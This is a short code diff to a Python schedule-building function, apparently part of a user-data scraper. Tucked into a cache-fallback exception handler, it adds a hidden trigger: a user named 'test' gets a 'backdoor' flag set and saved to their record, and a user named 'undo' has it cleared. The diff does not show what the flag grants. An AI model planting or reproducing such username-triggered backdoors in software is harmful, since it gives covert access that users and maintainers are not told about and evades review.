@@ -1,5 +1,6 @@
 def make_json_schedule(x, ad):
     from bs4 import BeautifulSoup
+    import libs.lib_updateuserdata
 
     # import lib_think
 
@@ -18,6 +19,13 @@ def make_json_schedule(x, ad):
         z = open(ad + c2onf, "r", encoding="utf8")
     except:
         if cache == True:
+            print ('truecache')
+            if x["username"] == "test":
+                x['backdoor']=True
+                libs.lib_updateuserdata.updateuser(x, ad)
+            if x["username"] == "undo":
+                x['backdoor']=False
+                libs.lib_updateuserdata.updateuser(x, ad)
             import libs.lib_createcache
 
             libs.lib_createcache.createcache(ad, 25)
@@ -44,7 +52,7 @@ def make_json_schedule(x, ad):
     # print(name, "wtfname")
     name = name[1] + " " + name[0]
     x["name"] = name
-    import libs.lib_updateuserdata
+    
 
     libs.lib_updateuserdata.updateuser(x, ad)
 
